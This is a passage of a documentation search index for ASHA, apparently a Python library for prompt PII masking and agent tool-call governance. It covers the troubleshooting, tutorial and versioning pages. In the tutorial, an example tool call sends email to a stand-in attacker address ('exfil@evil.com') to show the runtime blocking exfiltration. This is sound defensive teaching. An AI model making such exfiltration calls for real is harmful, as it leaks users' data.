<code>debug=True</code> in production hot paths.</p>"},{"location":"troubleshooting/#attributeerror-pipeline-processor","title":"AttributeError: Pipeline / Processor","text":"<p>Removed in v0.4.1:</p> <pre><code>from asha import process\nfrom asha.runtime import PromptProcessor\n</code></pre>"},{"location":"troubleshooting/#tests","title":"Tests","text":"<pre><code>pytest tests -q\n</code></pre>"},{"location":"troubleshooting/#still-stuck","title":"Still stuck?","text":"<ul> <li>FAQ \u00b7 Support policy</li> <li>GitHub Discussions</li> <li>ASHA Slack</li> </ul>"},{"location":"troubleshooting/#related","title":"Related","text":"<ul> <li>FAQ</li> <li>Migration v0.4</li> <li>Deprecations</li> <li>Performance</li> <li>Status</li> </ul>"},{"location":"tutorial/","title":"Tutorial","text":"<p>Goal: install ASHA, process one prompt end-to-end, wrap an LLM client pattern, and run a governed mock agent. About five minutes. (v0.4.2 developer preview \u2014 pin <code>asha==0.4.2</code>.)</p>"},{"location":"tutorial/#1-install","title":"1. Install","text":"<pre><code>pip install asha-ai\n</code></pre> <p>Python 3.10+ required. No API key and no model download are needed for this tutorial.</p> <p>Verify:</p> <pre><code>from asha import process\n\nprint(process(\"Hello world\").output)\n</code></pre>"},{"location":"tutorial/#2-process-a-prompt","title":"2. Process a prompt","text":"<p><code>process()</code> runs security \u2192 compile \u2192 optimize and always returns a typed <code>ProcessResult</code>. <code>str(result)</code> equals <code>result.output</code>.</p> <pre><code>from asha import process\n\nresult = process(\n    \"Contact john@example.com for data analysis\",\n    mode=\"balanced\",\n)\n\nprint(result.output)\nprint(result.security.pii_detected)\nprint(result.metrics)\n</code></pre> <p>Sensitive values are masked (emails, phones, SSNs, API keys, and related patterns). Teaching placeholders such as <code>test@example.com</code> are skipped.</p>"},{"location":"tutorial/#modes-you-will-use-most","title":"Modes you will use most","text":"Mode Behavior <code>balanced</code> Default \u2014 security + optimization; fail-open on total failure <code>strict</code> Fail-closed \u2014 raises on total failure <code>lite</code> Minimal policy features <code>off</code> Passthrough \u2014 prompt unchanged <pre><code>process(\"...\", mode=\"strict\")\nprocess(\"...\", mode=\"off\")\n</code></pre> <p>Security-only or optimize-only:</p> <pre><code>from asha import sanitize, optimize\n\nprint(sanitize(\"john@x.com\").output)\nprint(optimize(\"Please carefully and thoroughly analyze the following dataset\").output)\n</code></pre>"},{"location":"tutorial/#3-wrap-an-llm-client-optional","title":"3. Wrap an LLM client (optional)","text":"<p>Requires <code>pip install asha-ai[openai]</code> and <code>OPENAI_API_KEY</code>. Skip this step if you only want local preprocessing.</p> <pre><code>from asha.integrations import wrap_llm\nimport openai\n\nclient = wrap_llm(openai.OpenAI(), mode=\"balanced\")\n\nresponse = client.chat.completions.create(\n    model=\"gpt-4o-mini\",\n    messages=[{\"role\": \"user\", \"content\": \"Analyze data with john@email.com\"}],\n)\n</code></pre> <p>Import <code>wrap_llm</code> from <code>asha.integrations</code>, not the package root. Use <code>mode=\"off\"</code> for passthrough.</p>"},{"location":"tutorial/#4-govern-a-mock-agent-with-anchor","title":"4. Govern a mock agent with ANCHOR","text":"<p>ANCHOR compiles a mission contract and gates tool calls. Use <code>interactive=False</code> in scripts and CI so REVIEW verdicts do not block on a TTY prompt.</p> <pre><code>from asha import Agent, anchor\n\nagent = anchor(\n    Agent(provider=\"mock\", model=\"mock\", tools=[\"read_file\", \"email\"]),\n    risk_tolerance=\"LOW\",\n    isolation=\"auto\",\n    interactive=False,\n)\n\nprint(agent.run(\"Generate the monthly sales report from Q1 data\"))\n</code></pre> <p>To see an explicit ALLOW vs BLOCK decision without an LLM:</p> <pre><code>from asha.runtime.anchor import AnchorRuntime\nfrom asha.exceptions import ASHAAnchorBlocked\n\nruntime = AnchorRuntime(warn_policy=\"strict\", interactive=False, risk_tolerance=\"LOW\")\nruntime.initialize_mission(\n    \"Analyze Q1 sales locally and write a report. Do not send data externally.\",\n    context={\n        \"available_tools\": [\"load_sales_data\", \"write_report\", \"send_email\"],\n        \"local_only\": True,\n    },\n)\n\nassert runtime.evaluate_action_request(\n    \"tool_call\",\n    {\n        \"tool_name\": \"write_report\",\n        \"arguments\": str({\"args\": (), \"kwargs\": {\"report_content\": \"Q1 summary\"}}),\n    },\n)\n\ntry:\n    runtime.evaluate_action_request(\n        \"tool_call\",\n        {\n            \"tool_name\": \"send_email\",\n            \"arguments\": str({\"args\": (), \"kwargs\": {\"to\": \"exfil@evil.com\"}}),\n        },\n        raise_on_block=True,\n    )\nexcept ASHAAnchorBlocked as err:\n    print(err)\n</code></pre>"},{"location":"tutorial/#5-next-steps","title":"5. Next steps","text":"<ol> <li>Status \u2014 stable vs experimental</li> <li>Core concepts \u2014 results, modes, <code>PolicyConfig</code></li> <li>ANCHOR \u2014 mission contracts, isolation, adapters</li> <li>API reference \u2014 full signatures</li> <li>Security \u2014 PII and fail-closed behavior</li> </ol>"},{"location":"versioning/","title":"Versioning Policy","text":"<p>ASHA follows Semantic Versioning 2.0.0.</p>"},{"location":"versioning/#current-release","title":"Current release","text":"Version Status Notes 0.4.2 Active \u2014 developer preview Package rename (<code>asha</code>); ANCHOR agent governance. Install: <code>pip install asha-ai</code>. See status.md 0.4.1 Superseded Architecture complete; root API frozen 0.4.0 Superseded Typed results introduced 0.3.x Previous preview Dict/string returns, lazy root exports 1.0.x (2026-05) Retracted track Brief release; project returned to 0.x <p>PyPI classifier: Development Status :: 3 - Alpha</p>"},{"location":"versioning/#what-042-means","title":"What 0.4.2 means","text":"<ul> <li>PyPI package and imports renamed: <code>privysha</code> \u2192 <code>asha</code></li> <li>ANCHOR runtime: <code>anchor()</code>, mission guards, sandbox, framework adapters</li> <li>Root API: <code>process</code>, <code>sanitize</code>, <code>optimize</code>, <code>Agent</code>, <code>anchor</code></li> <li>Environment variables use <code>ASHA_*</code> prefix</li> <li>Layer boundaries enforced in CI</li> </ul>"},{"location":"versioning/#what-041-introduced","title":"What 0.4.1 introduced","text":"<ul> <li>Root API frozen: <code>process</code>, <code>sanitize</code>, <code>optimize</code>, <code>Agent</code> only</li> <li><code>Pipeline</code>, <code>Processor</code>, root <code>wrap_llm</code> removed (not deprecated)</li> <li><code>process(mode=)</code> + <code>policy=PolicyConfig(...)</code> - no loose deprecated kwargs</li> <li>Layer boundaries enforced in CI</li> </ul> <p>Breaking changes within 0.4.x are documented in the CHANGELOG and migration-v0.4.md.</p>"},{"location":"versioning/#api-stability-rules-042","title":"API stability rules (0.4.2)","text":""},{"location":"versioning/#stand-behind-core-drop-in","title":"Stand behind (core drop-in)","text":"<p>These are the APIs most applications should use. Behavior may improve, but signatures and result field names are frozen within 0.4.2 unless a documented breaking change lands in CHANGELOG:</p> Surface Notes <code>from asha import process, sanitize, optimize, Agent, anchor</code> Only root exports <code>process(..., mode=..., policy=...)</code> \u2192 <code>ProcessResult</code> Fields: <code>output</code>, <code>original</code>, <code>degraded</code>, <code>security</code>, <code>metrics</code>, \u2026 <code>sanitize(...)</code> \u2192 <code>SanitizeResult</code> Security-only <code>optimize(...)</code> \u2192 <code>OptimizeResult</code> Never runs security <code>from asha.integrations import wrap_llm</code> Preferred client wrapping <code>PolicyConfig</code> / policy modes <code>balanced</code>, <code>strict</code>, <code>lite</code>, <code>off</code> <p>Contract tests: <code>tests/public_api/</code>, <code>tests/contracts/</code>.</p>"},{"location":"versioning/#preview-pin-validate","title":"Preview (pin + validate)","text":"Surface Notes <code>anchor()</code> / <code>AnchorRuntime</code> / framework adapters Mission governance \u2014 validate on your agent stack Isolation modes <code>auto</code> / <code>hard</code> / <code>off</code> Container backends not implemented"},{"location":"versioning/#experimental-may-change-without-deprecation","title":"Experimental (may change without deprecation)","text":"<p>Emits <code>ASHAExperimentalWarning</code> at call time. Prefer core APIs above.</p> Surface Notes <code>recommend_local_model</code> / AshaFit Local model advisor <code>SmartRoutingAdapter</code> / <code>Agent(routing_config=...)</code> Task-based routing <code>auto_patch()</code> Global SDK monkey-patch \u2014 prefer <code>wrap_llm</code> <code>AdapterFactory</code> advanced helpers Beyond basic mock/openai create <p>Docs: experimental-features.md.</p>"},{"location":"versioning/#what-a-future-10-would-guarantee","title":"What a future 1.0 would guarantee","text":"<ul> <li>Semver-stable root + <code>wrap_llm</code> contracts</li> <li>Documented deprecation window before removals</li> <li>Published adapter support matrix for ANCHOR</li> </ul> <p>Until then, 0.x may still break with CHANGELOG notes.</p>"},{"location":"versioning/#path-to-100-deferred","title":"Path to 1.0.0 (deferred)","text":"<p>Stay on 0.4.2 until the product is fully built and the maintainer is ready to acknowledge a stable API. No rush.</p> <ol> <li>0.4.x - Current track (finish release leftovers + pilot quality here)</li> <li>0.5.x - Optional later freeze window (only if needed)</li> <li>1.0.0 - Only after the above \u2014 see production-readiness.md</li> </ol>"},{"location":"versioning/#breaking-changes-during-0x","title":"Breaking changes during 0.x","text":"<p>Allowed in any 0.x release. Documented in:</p> <ul> <li><code>CHANGELOG.md</code> on GitHub</li> <li><code>docs/migration-v0.4.md</code></li> <li><code>docs/deprecations.md</code></li> </ul> <p>After 1.0.0, breaking changes require a major release.</p>"},{"location":"versioning/#deprecation-policy-post-10","title":"Deprecation policy (post-1.0)","text":"<ul> <li>Deprecated APIs get at least one minor release with warnings before removal</li> <li>v0.4.1 removed several symbols without a deprecation period (breaking cleanup within 0.4.x)</li> </ul>"},{"location":"versioning/#python-support","title":"Python support","text":"<p>Python 3.10+ (3.10, 3.11, 3.12 tested in CI).</p>"},{"location":"versioning/#installing-vs-pinning","title":"Installing vs pinning","text":"<pre><code>pip install asha-ai          # default \u2014 everyone, lite path\n</code></pre> <pre><code># Optional: freeze the build you validated in a pilot\nasha==0.4.2\n</code></pre> <p>Review the CHANGELOG before upgrading across minor versions.</p>"}]}